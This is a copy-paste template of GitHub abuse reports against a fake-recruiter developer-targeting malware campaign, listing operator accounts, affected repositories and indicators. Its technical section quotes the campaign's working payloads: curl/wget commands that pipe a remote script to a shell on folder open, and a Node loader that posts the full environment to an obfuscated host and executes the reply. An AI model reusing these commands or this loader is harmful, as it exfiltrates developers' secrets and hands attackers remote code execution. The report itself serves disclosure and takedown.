# Abuse report — GitHub Trust & Safety

This case warrants **six separate filings** to maximize coverage across the two independent kinds of action GitHub Trust & Safety can take:

- **Content takedown** — disabling the malicious repository (`Malware or exploits` category). Filed *once*, against the repo you encountered.
- **Account suspension** — suspending the operator-controlled organizations and user accounts. Filed *once per entity* (three orgs + two users).

All six filings go through the same GitHub abuse contact form at **https://github.com/contact/report-content-or-abuse**. What differentiates the filings is two fields in the form:

1. **Which URL/handle you put in the "content/account being reported" field** — a repo URL for the content takedown, an org or user URL for each account suspension.
2. **Which abuse category you select** — `Malware or exploits` for the content takedown, an account-level category (typically `Other` or the closest matching option) for the account suspensions.

Filing the same case under both report types is intentional, not redundant: a content/malware report and an account-suspension report are reviewed by different processes inside T&S, and one is not a substitute for the other. (GitHub also exposes per-entity "Report" links on org and user pages — those route to the same contact form with the entity URL pre-filled, which is the easier path for filings #2–#6.)

This file is a **copy-paste template**. Before submitting, replace the case-specific placeholders below with values from this incident's [case file](./README.md) (or from your direct knowledge of the repo you were pointed at). The campaign-wide indicators (operator-controlled organization names, user accounts, C2 hostnames, etc.) are already filled in because they're the same across the cluster.

### Placeholders to fill in

| Placeholder | What to put | Where to find it |
|---|---|---|
| `<YOUR_REPO_URL>` | Full URL of the repository you were pointed at, e.g. `https://github.com/<org>/<repo>` | The recruiter's link, or the case file's "Subject" line |
| `<YOUR_REPO_OWNER>/<YOUR_REPO_NAME>` | The `org/repo` shorthand for the same repo | Same as above |
| `<COMMIT_SHA>` | The full 40-char commit SHA you analyzed | `git log -1 --format=%H` on your local clone, or the head SHA on the GitHub page |
| `<YOUR_NAME>` | Your name or GitHub handle, as you'd like it to appear on the report | (yourself) |

The org and user filings (filings #2–#6) use their own per-entity placeholders (`<ORG>` and `<USER>`) — listed at the top of those code blocks.

> On the rendered GitHub view of this file, hover over each `text` code block to get GitHub's click-to-copy icon — you'll get the verbatim text, not the rendered version. **For each filing, copy the matching subject + body code blocks and do the placeholder fill-in before pasting.**

---

## Filing checklist

Work top-down. The first filing requests content takedown (repo disablement) and carries the full technical evidence; filings #2–#6 request account suspensions. If you only have time for some of these, prioritize #1 and #2–#4 — org suspensions take down all an org's repos in one move.

| # | Target | Action requested | URL to paste in the form's "what are you reporting" field | Abuse category to select | Easiest entry point (pre-fills the URL) | Use these code blocks |
|---|---|---|---|---|---|---|
| 1 | The repo you were pointed at | Content takedown (disable the repo) | `<YOUR_REPO_URL>` | **Malware or exploits** | Go directly to **https://github.com/contact/report-content-or-abuse** and paste the URL. (There's no convenient per-repo "Report" button; for repo reports you always use the contact form directly.) | [Subject — main](#subject--main-report) + [Body — main](#body--main-report) |
| 2 | Org `AjunaWorkHub` | Account suspension | `https://github.com/AjunaWorkHub` | Account-level (use **Other** or the closest matching option; explain in the body) | Go to **https://github.com/AjunaWorkHub** → click the **"…"** kebab menu near the top right → **"Report abuse"** — this opens the contact form with the org URL pre-filled. | [Subject — org](#subject--org-filings) + [Body — org](#body--org-filings) |
| 3 | Org `AetSoftWorkHub` | Account suspension | `https://github.com/AetSoftWorkHub` | (same as #2) | Same flow as #2, starting from **https://github.com/AetSoftWorkHub** | (same as #2) |
| 4 | Org `DLabsHungary-Hub9` | Account suspension | `https://github.com/DLabsHungary-Hub9` | (same as #2) | Same flow, starting from **https://github.com/DLabsHungary-Hub9** | (same as #2) |
| 5 | User `GitWorkHub9` | Account suspension | `https://github.com/GitWorkHub9` | Account-level (use **Other** or the closest matching option) | Go to **https://github.com/GitWorkHub9** → click **"Block or report user"** below the profile picture → **"Report abuse"** — opens the contact form with the user URL pre-filled. | [Subject — user](#subject--user-filings) + [Body — user](#body--user-filings) |
| 6 | User `GitWorkHub99` | Account suspension | `https://github.com/GitWorkHub99` | (same as #5) | Same flow as #5, starting from **https://github.com/GitWorkHub99** | (same as #5) |

If a UI label doesn't match exactly (GitHub does adjust placement), the universal fallback for *any* of these is to open **https://github.com/contact/report-content-or-abuse** manually, paste the URL from the third column, select the category from the fourth column, and paste the matching subject + body. Each filing creates a separate T&S ticket but all reference the same campaign — that's intentional, since content-takedown and account-suspension decisions are made in different review queues.

---

## Which entities qualify for filing — and why

The five named entities in the table above (three orgs, two users) are chosen because **each one shows multiple independent signals of being created specifically for this campaign**, not because they merely appear in our sibling-repo enumeration. Requesting suspension of an account that turns out to be a compromised legitimate developer's would be wrong and could harm the victim further — so the filter matters.

The signals applied are:

- **Single-repo / single-purpose account.** The org or user account hosts exactly one substantive repository, and that repo is part of the campaign.
- **Recent creation, clustered in time.** The account was created within weeks of campaign activity, often the same day as a sibling operator account, often with adjacent GitHub numeric IDs (which implies batch creation by the same operator).
- **No legitimate activity surface.** No prior unrelated repos, no PR history elsewhere, no contributions to open-source projects, no public profile content suggesting real developer use. (Caveat: this signal flips for credibility-farming accounts — see `GitWorkHub99` below — where the operator has *manufactured* an activity surface from clones of well-known OSS projects.)
- **Naming-pattern match across entities.** A naming convention shared across multiple of the campaign's identities (`*WorkHub*`, `Hub9`, `Hub99`, etc.) implies a single operator running multiple personas.
- **Commit-author email convention.** Use of the Gmail `+N` alias convention (`foo+1@gmail.com`, `foo+2@gmail.com`) is a strong tell that the operator is running parallel personas off a single inbox.
- **Verifiable malicious content.** The hosted repository carries the malware-loader code analyzed in [the main case file](./README.md), independently verifiable via GitHub code search.

Applied to the entities:

| Entity | Signals matched |
|---|---|
| `AjunaWorkHub` (org, id 276264331) | Single repo (`AjunaVerse_MVP`); created 2026-04-27; no other org activity; adjacent id and same-day creation as `AetSoftWorkHub`; `*WorkHub*` naming pattern; hosts verified malware-loader code. |
| `AetSoftWorkHub` (org, id 276275397) | Single repo (`AetSoft_MVP`); created 2026-04-27 (same day as AjunaWorkHub); adjacent id; no other org activity; `*WorkHub*` naming pattern; hosts the bit-identical `.vscode/tasks.json` blob as AjunaVerse_MVP (proving operator linkage). |
| `DLabsHungary-Hub9` (org) | Single substantive repo carrying the loader; `Hub9` suffix matches the `GitWorkHub9` username (single-operator naming convention); fake-business framing typical of fake-recruiter front orgs. |
| `GitWorkHub9` (user, id 272514006) | Sole committer to `AjunaVerse_MVP`; commit-author email `fatihafariya8+2@gmail.com` (Gmail `+N` alias — implies parallel operator personas); `*WorkHub*` + numeric-suffix naming pattern shared with three operator orgs. |
| `GitWorkHub99` (user, id 213663943) | `*WorkHub*` + double-9 numeric-suffix naming pattern matches the operator convention; hosts a sibling campaign repo (`AetSoftVerse`); the ~20 clones of well-known open-source projects (`llama.cpp`, `prettier`, `angular-cli`, `nuxt.com`, `Xray-core`, etc.) match the publicly-documented **"credibility farming"** TTP used by fake-recruiter operators to give the GitHub profile the visual ballast of a legitimate developer. |

### What about the earlier-generation sibling repos?

The earlier-generation repos catalogued in the main case file (e.g. `prahaladbelavadi/CoinLocatorDemo`, `sky-cook/tokentradingdapp`, `WilliamSuhosky/Property-Voting-DApp`, `artemus-jarrett/blockchain-voting-system`, `Andrii-888/0gRollplay`, etc.) carry the loader code but their account histories are mixed. Some of these accounts have prior unrelated activity that's consistent with a legitimate developer whose account was later compromised and repurposed. **For those, we request repo takedown via the main report (filing #1) but explicitly *not* account suspension** — GitHub T&S should investigate each individually and pursue account recovery where appropriate.

If, while filing, you find clear evidence that one of those accounts *is* operator-controlled (the only activity is the campaign repo, naming pattern matches, etc.), add it to the user-filings list and use the user-filing template below.

---

## Subject — main report

```text
Coordinated multi-org developer-targeting malware campaign on GitHub — at least 15 repositories across the AjunaWorkHub, AetSoftWorkHub, and DLabsHungary-Hub9 organizations (plus individual accounts) deliver RCE and credential-theft payloads to developers via fake recruiting outreach
```

## Body — main report

```text
SUMMARY

This is a CAMPAIGN-LEVEL abuse report covering an active, operationally-coordinated developer-targeting malware operation distributing remote-code-execution and credential-theft payloads via at least 15 GitHub repositories spread across multiple organizations and individual accounts. The repositories share an identical loader idiom and have been enumerated via GitHub code search on the distinctive strings "verify(setApiKey(process.env.AUTH_API))" and 'new Function("require", response.data)'. The TTPs match the publicly-documented "Contagious Interview" cluster (fake-recruiter cold outreach -> instruction to clone and run a "Web3 MVP" repository ahead of an interview -> compromise on first run).

Reporting on behalf of: <YOUR_REPO_URL> (one of the cluster's known repositories). Cluster-wide takedown is the requested action.

This report is paired with five additional per-entity filings (against three organizations: AjunaWorkHub, AetSoftWorkHub, DLabsHungary-Hub9; and two user accounts: GitWorkHub9, GitWorkHub99). Please cross-reference for cluster-wide handling.


FULL CASE FILE

A public, regularly-maintained case file for this campaign -- including the annotated technical analysis, machine-readable IOCs (CSV/JSON), and detection rules (YARA, Sigma, grep) -- is at:

  https://github.com/bryanchriswhite/dev-trap-dossiers


KNOWN CAMPAIGN REPOSITORIES

The repositories are listed below in two groups based on whether the OWNING ACCOUNT is operator-controlled (suspend the account) or likely a compromised legitimate developer's account (take down the repo but DO NOT suspend the account -- the account holder is a victim of a different attack). All repos carry verified malware-loader code and warrant takedown regardless of account status.

Current generation (loader at server/routes/api/auth.js) -- repos on operator-controlled accounts (suspend account):

- https://github.com/AjunaWorkHub/AjunaVerse_MVP   (org AjunaWorkHub, id 276264331; multi-signal operator-owned -- see "Highest-confidence operator-controlled identities" section below)
- https://github.com/AetSoftWorkHub/AetSoft_MVP    (org AetSoftWorkHub, id 276275397; multi-signal operator-owned; bit-identical .vscode/tasks.json blob with AjunaVerse_MVP)
- https://github.com/DLabsHungary-Hub9/DLabs-Platform-MVP2  (org DLabsHungary-Hub9; single-repo single-purpose org, "Hub9" naming match)
- https://github.com/roamanbuild/OnyxVerse         (user roamanbuild; account hosts only campaign-shape repos -- OnyxVerse, ACN-Verse, Japanese-Royal, plus *-demo9 variants matching the operator's numeric-9-suffix persona convention; no legitimate-developer activity)

Current generation -- repos on LIKELY COMPROMISED LEGITIMATE accounts (take down repo only; please investigate the account, do not suspend without further evidence):

- https://github.com/khaleb-dev/jackpot     (account khaleb-dev has ~55 repos over 5+ years across PHP/Java/Vue/Dart -- consistent with a real developer's portfolio that has been compromised)
- https://github.com/rony1235/Jp-Soccer     (account rony1235 exists since 2017 with ~11 mostly-low-activity repos; three campaign-shape repos added in April-May 2026 suggest recent compromise)
- https://github.com/mspkteam/williampotter (account mspkteam hosts a mix of older legitimate-looking repos (fitnesssworldadminpanel, ETC-Coporative-code, specialized_medical) and the campaign one; pattern matches account compromise)

Earlier generation (loader at app/controllers/frontController.js -- same loader code, different scaffold) -- repos on LIKELY COMPROMISED LEGITIMATE accounts (take down repo, investigate account):

- https://github.com/Andrii-888/0gRollplay
- https://github.com/prahaladbelavadi/CoinLocatorDemo
- https://github.com/sky-cook/tokentradingdapp
- https://github.com/WilliamSuhosky/Property-Voting-DApp
- https://github.com/artemus-jarrett/blockchain-voting-system
- https://github.com/TechByteX/NitroGem    (uncertain -- not investigated in depth)
- https://github.com/jamesm-dev/NitroGem   (uncertain -- not investigated in depth)
- https://github.com/dappfusion/defi-real-estate    (uncertain -- not investigated in depth)
- https://github.com/InvescoHub/defi-real-estate    (uncertain -- not investigated in depth)

Highest-confidence operator-controlled identities (appropriate targets for org/user-level suspension; filed separately via per-entity reports):

- Org: AjunaWorkHub (GitHub id 276264331, created 2026-04-27)
- Org: AetSoftWorkHub (GitHub id 276275397, created 2026-04-27 -- adjacent ID, same day, bit-identical .vscode/tasks.json)
- Org: DLabsHungary-Hub9
- User: GitWorkHub9 (id 272514006) -- sole committer to AjunaWorkHub/AjunaVerse_MVP, commit author email fatihafariya8+2@gmail.com (Gmail "+N" alias convention implies parallel personas)
- User: GitWorkHub99 (id 213663943) -- approximately 20 "credibility farming" clones of widely-used open-source projects (llama.cpp, prettier, angular-cli, nuxt.com, Xray-core, etc.) plus a sibling campaign repo "AetSoftVerse"

Additional likely-operator-owned user account (not currently filed separately, but warrants consideration for account suspension):

- User: roamanbuild -- account hosts only campaign-shape repositories (OnyxVerse, ACN-Verse, Japanese-Royal, and *-demo9 variants matching the operator's numeric-9-suffix persona convention seen in GitWorkHub9, GitWorkHub99, and DLabsHungary-Hub9). No legitimate-developer activity. All repos created within a one-week window in May 2026.


TECHNICAL MECHANISM (analyzed from <YOUR_REPO_URL> at commit <COMMIT_SHA>; the same loader pattern is present in every current-generation repo listed above)

The repositories carry three INDEPENDENT code-execution vectors. Any one of them is sufficient to fully compromise a developer's workstation. They are redundant by design so that even if one is neutralized the others still fire.

(1) VS Code tasks.json auto-run on folder open.
    File: <YOUR_REPO_URL>/blob/<COMMIT_SHA>/.vscode/tasks.json
    Campaign IOC: the same .vscode/tasks.json blob (git blob SHA 998c34f02d94169a546b4c36123d552dd14f985b) appears BIT-IDENTICAL in BOTH AjunaWorkHub/AjunaVerse_MVP AND AetSoftWorkHub/AetSoft_MVP, proving cross-org operator coordination.
    Defines a task with "runOn": "folderOpen" and these per-OS commands:
      osx:     curl -L 'https://vscode-settings-0506.vercel.app/api/settings/mac' | bash
      linux:   wget -qO- 'https://vscode-settings-0506.vercel.app/api/settings/linux' | sh
      windows: curl --ssl-no-revoke -L https://vscode-settings-0506.vercel.app/api/settings/windows | cmd
    All output is suppressed ("reveal": "silent", "echo": false, "focus": false, "panel": "new", "close": true). The malicious lines are also padded with ~200 trailing spaces so the commands sit far off the right edge of a single line in any non-wrapping editor -- deliberate hide-in-plain-sight obfuscation.

(2) package.json "prepare" lifecycle hook.
    File: <YOUR_REPO_URL>/blob/<COMMIT_SHA>/package.json
    Sets "prepare": "node server/server.js", which causes the in-repo Express server to launch during ordinary "npm install" (prepare is less notorious than postinstall and tends to escape security review). Additionally, all of start, build, test, and eject pipe "node server/server.js" into "react-scripts", so any normal "run the project" command also launches the malicious server.

(3) Server boot-time process.env exfiltration + arbitrary Node RCE.
    Files: <YOUR_REPO_URL>/blob/<COMMIT_SHA>/server/routes/api/auth.js and <YOUR_REPO_URL>/blob/<COMMIT_SHA>/server/controllers/auth.js
    On module load, the code POSTs { ...process.env } to a base64-obfuscated URL committed in .env as
      AUTH_API=aHR0cHM6Ly9pcC1jb3JlLWFwaS1vbmUudmVyY2VsLmFwcC9hcGk=
    which decodes to https://ip-core-api-one.vercel.app/api, and then executes the response body as JS via "new Function('require', response.data)(require)". The injected "require" gives the attacker access to fs, child_process, etc. -- full arbitrary Node RCE running as the developer's user. The POST body is the developer's entire shell environment (any AWS_*, GITHUB_TOKEN, NPM_TOKEN, OPENAI_API_KEY, ANTHROPIC_API_KEY, etc. they have exported).
    Verbatim primitive:
        const setApiKey = (s) => atob(s);
        const verify = (api) =>
          axios.post(api, { ...process.env }, { headers: { "x-app-request": "ip-check" } });
        // at module top level:
        verify(setApiKey(process.env.AUTH_API))
          .then((response) => {
            const executor = new Function("require", response.data);
            executor(require);
          });
    The wrapper names "setApiKey" and "verify" are semantic misdirection -- there is no API key and no verification. The accompanying console log "Aborting mempool scan due to failed API verification." is also misdirection: there is no mempool scan anywhere in the codebase.


ACCEPTABLE USE POLICY VIOLATIONS

The repositories violate GitHub's Acceptable Use Policies (https://docs.github.com/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) -- specifically:

- the prohibition on content that "directly supports unlawful active attacks or malware campaigns that are causing technical harms,"
- the prohibitions on phishing and social engineering, and
- the prohibition on malware delivery.

Intent is established by the base64 obfuscation of the C2 URL in committed .env, the whitespace-padding obfuscation of the malicious commands in .vscode/tasks.json, the semantic misdirection in the loader's wrapper-function names ("setApiKey", "verify", "validateApiKey"), and the misleading console log strings ("Aborting mempool scan...") accompanying code that performs neither mempool scanning nor API verification.


REQUESTED ACTIONS

1. Take down all current-generation repositories listed above, irrespective of account status:
   - AjunaWorkHub/AjunaVerse_MVP
   - AetSoftWorkHub/AetSoft_MVP
   - DLabsHungary-Hub9/DLabs-Platform-MVP2
   - roamanbuild/OnyxVerse
   - khaleb-dev/jackpot
   - rony1235/Jp-Soccer
   - mspkteam/williampotter

2. Suspend the operator-controlled organizations: AjunaWorkHub (id 276264331), AetSoftWorkHub (id 276275397), DLabsHungary-Hub9. (Filed separately via per-org abuse reports.)

3. Suspend the operator-controlled user accounts: GitWorkHub9 (id 272514006), GitWorkHub99 (id 213663943). (Filed separately via per-user abuse reports.) Roamanbuild also shows operator-controlled signals (all-campaign-repo account, operator-naming-convention match) and warrants consideration for suspension; it is not separately filed below but may be added if pursuing comprehensive cluster takedown.

4. For ALL repositories on likely-compromised-legitimate accounts (khaleb-dev, rony1235, mspkteam in the current generation; Andrii-888, prahaladbelavadi, sky-cook, WilliamSuhosky, artemus-jarrett in the earlier generation; plus the uncertain accounts TechByteX, jamesm-dev, dappfusion, InvescoHub), please investigate the account profile before any suspension action -- these account holders may be victims of compromise and would need account recovery rather than suspension. The repositories themselves should be taken down regardless.

5. Consider adding the distinctive code strings -- 'verify(setApiKey(process.env.AUTH_API))', 'new Function("require", response.data)', and the header 'x-app-request: ip-check' -- to GitHub's malware-content scanning to catch future iterations of this campaign.


CORROBORATING THIRD-PARTY DOCUMENTATION

The campaign is documented by at least six independent researchers, satisfying any "weaponized in the wild" requirement:

- defdone/rtidx-evidence -- reports/amonixplay-evidence-report.md (analysis of an earlier sibling)
- oliver-zehentleitner/technopathy
- reymom/portfolio-site -- content/security/2026-04-15-supply-chain-attack.mdx
- nickgallick/perlantir-fleet -- references the campaign in a supply-chain-audit skill
- S0AndS0/S0AndS0.github.io -- misc/_scammers/2026-04-10_Larry-Bogie-of-BitAngels-Investment-Group.md
- jamesm-dev/NitroGem -- SECURITY_FINDINGS.md (captured loader file with annotations)


REPORTED BY

<YOUR_NAME>
```

---

## Subject — org filings

Use the same subject for each of filings #2, #3, #4. Replace `<ORG>` with the org login (`AjunaWorkHub`, `AetSoftWorkHub`, or `DLabsHungary-Hub9`).

```text
Organization <ORG> is operator-controlled in an active multi-org developer-targeting malware campaign (Contagious Interview TTP cluster) — request organization suspension
```

## Body — org filings

The same body works for each org filing. Before submitting, replace `<ORG>` with the specific org login — the entity-specific signals for each candidate are listed at the bottom of the body so the analyst sees them directly.

```text
SUMMARY

The GitHub organization <ORG> is operator-controlled in an active multi-org developer-targeting malware campaign matching the publicly-documented "Contagious Interview" TTP cluster (fake-recruiter cold outreach -> instruction to clone and run a "Web3 MVP" repository ahead of an interview -> compromise on first run).

A campaign-level abuse report covering the full technical mechanism and the ~15 affected repositories has been filed separately via https://github.com/contact/report-abuse with the subject:
  "Coordinated multi-org developer-targeting malware campaign on GitHub -- at least 15 repositories across the AjunaWorkHub, AetSoftWorkHub, and DLabsHungary-Hub9 organizations (plus individual accounts) deliver RCE and credential-theft payloads to developers via fake recruiting outreach"
Please cross-reference for cluster-wide handling.

This filing is one of three per-org filings (against AjunaWorkHub, AetSoftWorkHub, DLabsHungary-Hub9) plus two per-user filings (against GitWorkHub9, GitWorkHub99). Together with the main repo report, six filings cover the cluster.

Public case file (technical analysis, IOCs, detection rules):
  https://github.com/bryanchriswhite/dev-trap-dossiers


WHY THIS ORG QUALIFIES AS OPERATOR-CONTROLLED

The org is targeted for suspension because MULTIPLE INDEPENDENT SIGNALS indicate it was created specifically for this campaign and is not a compromised legitimate organization:

- Hosts exactly one substantive public repository, which is part of the campaign and carries verifiable malware-loader code (analyzed in the main report).
- Created recently and clustered in time with sibling operator orgs:
    - AjunaWorkHub:  GitHub id 276264331, created 2026-04-27
    - AetSoftWorkHub: GitHub id 276275397, created 2026-04-27 (same day, ADJACENT id -- proves batch creation by a single operator)
    - DLabsHungary-Hub9
- No org-level activity (members, teams, contributions to external repos, etc.) outside the campaign repository.
- Naming pattern shared across operator identities: the convention "<X>WorkHub" appears in AjunaWorkHub, AetSoftWorkHub, and the operator user account GitWorkHub9; the "Hub9" suffix appears in DLabsHungary-Hub9 and matches the username GitWorkHub9.
- The bit-identical .vscode/tasks.json blob (SHA 998c34f02d94169a546b4c36123d552dd14f985b) appears in BOTH AjunaWorkHub/AjunaVerse_MVP AND AetSoftWorkHub/AetSoft_MVP, proving cross-org operator coordination.


REQUESTED ACTION

Suspend the organization <ORG> and take down its repositories. The main repo abuse filing covers the technical evidence and the full Acceptable Use Policy citation in detail.


REPORTED BY

<YOUR_NAME>
```

---

## Subject — user filings

Use the same subject for each of filings #5 and #6. Replace `<USER>` with the username (`GitWorkHub9` or `GitWorkHub99`).

```text
User <USER> is operator-controlled in an active multi-org developer-targeting malware campaign (Contagious Interview TTP cluster) — request account suspension
```

## Body — user filings

The same body works for both user filings. Before submitting, replace `<USER>` with the specific username; the entity-specific signals for both candidates are listed at the bottom so the analyst sees the rationale directly.

```text
SUMMARY

The GitHub user account <USER> is operator-controlled in an active multi-org developer-targeting malware campaign matching the publicly-documented "Contagious Interview" TTP cluster (fake-recruiter cold outreach -> instruction to clone and run a "Web3 MVP" repository ahead of an interview -> compromise on first run).

A campaign-level abuse report covering the full technical mechanism and the ~15 affected repositories has been filed separately via https://github.com/contact/report-abuse with the subject:
  "Coordinated multi-org developer-targeting malware campaign on GitHub -- at least 15 repositories across the AjunaWorkHub, AetSoftWorkHub, and DLabsHungary-Hub9 organizations (plus individual accounts) deliver RCE and credential-theft payloads to developers via fake recruiting outreach"
Please cross-reference for cluster-wide handling.

This filing is one of two per-user filings (against GitWorkHub9 and GitWorkHub99) plus three per-org filings (against AjunaWorkHub, AetSoftWorkHub, DLabsHungary-Hub9). Together with the main repo report, six filings cover the cluster.

Public case file (technical analysis, IOCs, detection rules):
  https://github.com/bryanchriswhite/dev-trap-dossiers


WHY THIS USER QUALIFIES AS OPERATOR-CONTROLLED

The user is targeted for suspension because MULTIPLE INDEPENDENT SIGNALS indicate the account is operator-created and is not a compromised legitimate developer:

- Naming pattern: "GitWorkHub" + numeric suffix matches a convention used across operator identities including the orgs AjunaWorkHub, AetSoftWorkHub, and DLabsHungary-Hub9 (the "Hub9" suffix). Multiple personas sharing a naming convention strongly implies a single operator.
- Account activity centers on operator-controlled repositories rather than independent development.

For GitWorkHub9 (GitHub id 272514006) specifically:
- Sole committer to AjunaWorkHub/AjunaVerse_MVP (a campaign repo).
- Commit-author email "fatihafariya8+2@gmail.com" uses the Gmail "+N" alias convention. The "+2" suffix is the operator's persona-numbering bookkeeping and implies parallel personas at +1, +3, and beyond -- this is a strong fingerprint of multi-persona operator activity off a single inbox.

For GitWorkHub99 (GitHub id 213663943) specifically:
- "GitWorkHub" + double-9 numeric-suffix naming matches the operator convention (parallels GitWorkHub9).
- Hosts a sibling campaign repository "AetSoftVerse" carrying the same loader code.
- Profile shows approximately 20 clones/forks of widely-used open-source projects (llama.cpp, prettier, angular-cli, nuxt.com, Xray-core, refit, mosaic, tinygrad, language-tools, and others) with minimal substantive activity per repo. This matches the publicly-documented "credibility farming" TTP: the operator deliberately accumulates clones of high-profile projects to give the profile the visual ballast of a legitimate developer's GitHub presence ahead of a fake-recruiter pitch.


REQUESTED ACTION

Suspend the user account <USER>. The main repo abuse filing covers the technical evidence and the full Acceptable Use Policy citation in detail.


REPORTED BY

<YOUR_NAME>
```

---

## Supporting artifacts (for your reference; do not paste these into any filing)

- Full technical analysis: [`README.md`](./README.md)
- IOCs in machine-readable form: [`iocs.csv`](./iocs.csv), [`iocs.json`](./iocs.json)
- Detection rules: [`detection-rules.md`](./detection-rules.md)
- Companion abuse report for the Vercel-hosted C2: [`abuse-report-vercel.md`](./abuse-report-vercel.md)
